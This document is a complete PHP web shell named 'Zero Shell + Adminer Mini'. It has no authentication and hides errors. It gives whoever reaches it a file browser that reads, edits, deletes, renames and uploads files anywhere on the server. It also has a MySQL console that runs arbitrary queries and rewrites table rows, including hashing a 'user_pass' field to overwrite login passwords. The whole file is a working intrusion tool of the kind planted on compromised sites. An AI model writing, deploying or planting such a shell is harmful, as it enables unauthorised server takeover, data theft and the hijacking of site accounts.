<?php
error_reporting(0);
session_start();

if (isset($_POST['connect_db'])) {
    $host = $_POST['db_host'];
    $user = $_POST['db_user'];
    $pass = $_POST['db_pass'];
    $dbname = $_POST['db_name'];
    $conn = mysqli_connect($host, $user, $pass);
    if ($conn) {
        $_SESSION['db_host'] = $host;
        $_SESSION['db_user'] = $user;
        $_SESSION['db_pass'] = $pass;
        $db_msg = "<span style='color:lime;'>[+] Connected</span>";
        if (!empty($dbname)) {
            if (mysqli_select_db($conn, $dbname)) {
                $_GET['db'] = $dbname;
            } else {
                $db_msg .= " <span style='color:red;'>[!] DB not found</span>";
            }
        }
    } else {
        $db_msg = "<span style='color:red;'>[-] " . mysqli_connect_error() . "</span>";
    }
} elseif (isset($_SESSION['db_host'])) {
    $conn = mysqli_connect($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass']);
}

if ($conn && isset($_GET['db'])) mysqli_select_db($conn, $_GET['db']);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Zero Shell + Adminer Mini</title>
    <style>
        body { background-color: black; color: white; font-family: monospace; }
        a { color: aqua; text-decoration: none; }
        input, textarea { background: black; color: lime; border: 1px solid #444; font-family: monospace; }
        table { border-collapse: collapse; width: 100%; color: white; }
        th, td { border: 1px solid #888; padding: 5px; }
        fieldset { margin-bottom: 10px; }
    </style>
    <script>
    document.addEventListener("DOMContentLoaded", function () {
        const visited = JSON.parse(localStorage.getItem("visitedLinks") || "[]");
        document.querySelectorAll("a").forEach(a => {
            const href = a.getAttribute("href");
            if (visited.includes(href)) a.style.color = "#ccff66";
            a.addEventListener("click", () => {
                if (!visited.includes(href)) {
                    visited.push(href);
                    localStorage.setItem("visitedLinks", JSON.stringify(visited));
                }
            });
        });
    });
    </script>
</head>
<body>
<h2>Zero Shell + Adminer Mode</h2>
<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
chdir($path);

echo "<b>📂 Path:</b> ";
$parts = explode("/", trim($path, "/"));
$build = ($path[0] === "/") ? "/" : "";
if ($path[0] === "/") echo "<a href='?path=/'>/</a>";
foreach ($parts as $p) {
    $build .= ($build === "/" ? "" : "/") . $p;
    echo "<a href='?path=" . urlencode($build) . "'>$p</a>/";
}
echo "<br><br><pre>";

$folders = $files = [];
foreach (scandir($path) as $f) {
    if ($f === "." || $f === "..") continue;
    if (is_dir($f)) $folders[] = $f;
    else $files[] = $f;
}
foreach ($folders as $f) {
    echo "[DIR ] <a href='?path=" . urlencode("$path/$f") . "'>$f</a> ";
    echo "[ <a href='?path=" . urlencode($path) . "&del=" . urlencode($f) . "'>delete</a> | ";
    echo "<a href='?path=" . urlencode($path) . "&rename=" . urlencode($f) . "'>rename</a> ]\n";
}
foreach ($files as $f) {
    echo "[FILE] <a href='?path=" . urlencode($path) . "&read=" . urlencode($f) . "'>$f</a> ";
    echo "[ <a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "'>edit</a> | ";
    echo "<a href='?path=" . urlencode($path) . "&del=" . urlencode($f) . "'>delete</a> | ";
    echo "<a href='?path=" . urlencode($path) . "&rename=" . urlencode($f) . "'>rename</a> ]\n";
}
echo "</pre>";

if (isset($_GET['del'])) {
    $target = "$path/" . $_GET['del'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
}
if (isset($_GET['rename']) && !isset($_POST['newname'])) {
    echo "<form method='POST'>Rename '" . htmlspecialchars($_GET['rename']) . "' to: <input type='text' name='newname'><input type='submit' value='Rename'></form>";
} elseif (isset($_GET['rename']) && isset($_POST['newname'])) {
    rename("$path/" . $_GET['rename'], "$path/" . $_POST['newname']);
}
if (isset($_GET['edit']) && !isset($_POST['content'])) {
    $file = "$path/" . $_GET['edit'];
    echo "<form method='POST'><textarea name='content' rows='20' style='width:100%;'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br><input type='submit' value='Save'></form>";
} elseif (isset($_GET['edit']) && isset($_POST['content'])) {
    file_put_contents("$path/" . $_GET['edit'], $_POST['content']);
}
if (isset($_GET['read'])) {
    echo "<h4>Viewing: " . htmlspecialchars($_GET['read']) . "</h4><pre>" . htmlspecialchars(file_get_contents("$path/" . $_GET['read'])) . "</pre>";
}
?>
<form enctype='multipart/form-data' method='POST'>
    <input type='file' name='file' /><input type='submit' name='upload' value='Upload' />
</form>
<?php
if (isset($_POST['upload'])) move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
?>
<form method="POST">
    <fieldset style="width:400px;">
        <legend><b>Connect to MySQL</b></legend>
        Host: <input type="text" name="db_host" value="localhost"><br>
        User: <input type="text" name="db_user"><br>
        Pass: <input type="password" name="db_pass"><br>
        DB (optional): <input type="text" name="db_name"><br>
        <input type="submit" name="connect_db" value="Connect">
    </fieldset>
</form>
<?php
if ($conn && isset($_GET['db'])) mysqli_select_db($conn, $_GET['db']);

if ($conn && isset($_POST['sql_exec']) && isset($_GET['db'])) {
    $query = $_POST['query'];
    $result = mysqli_query($conn, $query);
    if (is_bool($result)) echo $result ? "Query executed successfully." : "Query failed.";
    else {
        echo "<table border=1 cellpadding=5><tr>";
        while ($field = mysqli_fetch_field($result)) echo "<th>{$field->name}</th>";
        echo "</tr>";
        while ($row = mysqli_fetch_assoc($result)) {
            echo "<tr>";
            foreach ($row as $val) echo "<td>" . htmlspecialchars($val) . "</td>";
            echo "</tr>";
        }
        echo "</table>";
    }
}
if ($conn && isset($_GET['db'])) {
    echo "<h3>📦 Database List</h3>";
    $dbs = mysqli_query($conn, "SHOW DATABASES");
    while ($db = mysqli_fetch_row($dbs)) echo "<a href='?db=" . urlencode($db[0]) . "'>$db[0]</a><br>";
}
if ($conn && isset($_GET['db'])) {
    echo "<h3>📂 DB: " . htmlspecialchars($_GET['db']) . "</h3>";
    $tables = mysqli_query($conn, "SHOW TABLES");
    while ($tbl = mysqli_fetch_row($tables)) echo "<a href='?db=" . urlencode($_GET['db']) . "&tbl=" . urlencode($tbl[0]) . "'>{$tbl[0]}</a><br>";
    echo "<h4>Run SQL Query:</h4><form method='POST'><textarea name='query' rows='5' cols='80'></textarea><br><input type='submit' name='sql_exec' value='Run'></form>";
}

if ($conn && isset($_GET['db']) && isset($_GET['tbl'])) {
    $db = $_GET['db'];
    $tbl = $_GET['tbl'];
    mysqli_select_db($conn, $db);
    if (isset($_POST['save_row']) && isset($_POST['row'])) {
        $pk = array_key_first($_POST['row']);
        $id = $_POST['edit_pk'];
        $cols = [];
        foreach ($_POST['row'] as $k => $v) {
            if ($k == 'user_pass' && isset($_POST['hash_method']) && $_POST['hash_method']) {
                $method = $_POST['hash_method'];
                if ($method == 'md5') $v = md5($v);
                elseif ($method == 'sha1') $v = sha1($v);
                elseif ($method == 'sha256') $v = hash('sha256', $v);
            }
            $cols[] = "`$k`='" . mysqli_real_escape_string($conn, $v) . "'";
        }
        mysqli_query($conn, "UPDATE `$tbl` SET " . implode(", ", $cols) . " WHERE `$pk`='" . mysqli_real_escape_string($conn, $id) . "' LIMIT 1");
    }

    $res = mysqli_query($conn, "SELECT * FROM `$tbl` LIMIT 100");
    echo "<h3>🧾 Table: $tbl (LIMIT 100)</h3><table><tr>";
    $fields = [];
    while ($field = mysqli_fetch_field($res)) {
        $fields[] = $field->name;
        echo "<th>{$field->name}</th>";
    }
    echo "<th>Action</th></tr>";
    while ($row = mysqli_fetch_assoc($res)) {
        echo "<tr>";
        $primaryKeyValue = $row[$fields[0]];
        foreach ($row as $v) echo "<td>" . htmlspecialchars($v) . "</td>";
        echo "<td><a href='?db=" . urlencode($db) . "&tbl=" . urlencode($tbl) . "&edit_row=" . urlencode($primaryKeyValue) . "'>[Edit]</a></td>";
        echo "</tr>";
    }
    echo "</table>";

    if (isset($_GET['edit_row'])) {
        $edit_id = $_GET['edit_row'];
        $pk = $fields[0];
        $row = mysqli_fetch_assoc(mysqli_query($conn, "SELECT * FROM `$tbl` WHERE `$pk`='" . mysqli_real_escape_string($conn, $edit_id) . "' LIMIT 1"));
        echo "<h4>Edit Row [$pk = $edit_id]</h4><form method='POST'>";
        foreach ($row as $k => $v) {
            $readonly = ($k == $pk) ? "readonly" : "";
            if ($k == 'user_pass') {
                echo "$k: <input type='text' name='row[$k]' value='" . htmlspecialchars($v) . "' $readonly><br>";
                echo "Hash: <select name='hash_method'><option value=''>Plain</option><option value='md5'>MD5</option><option value='sha1'>SHA1</option><option value='sha256'>SHA256</option></select><br>";
            } else {
                echo "$k: <input type='text' name='row[$k]' value='" . htmlspecialchars($v) . "' $readonly><br>";
            }
        }
        echo "<input type='hidden' name='edit_pk' value='" . htmlspecialchars($edit_id) . "'><input type='submit' name='save_row' value='Save'></form>";
    }
}
?>
</body>
</html>
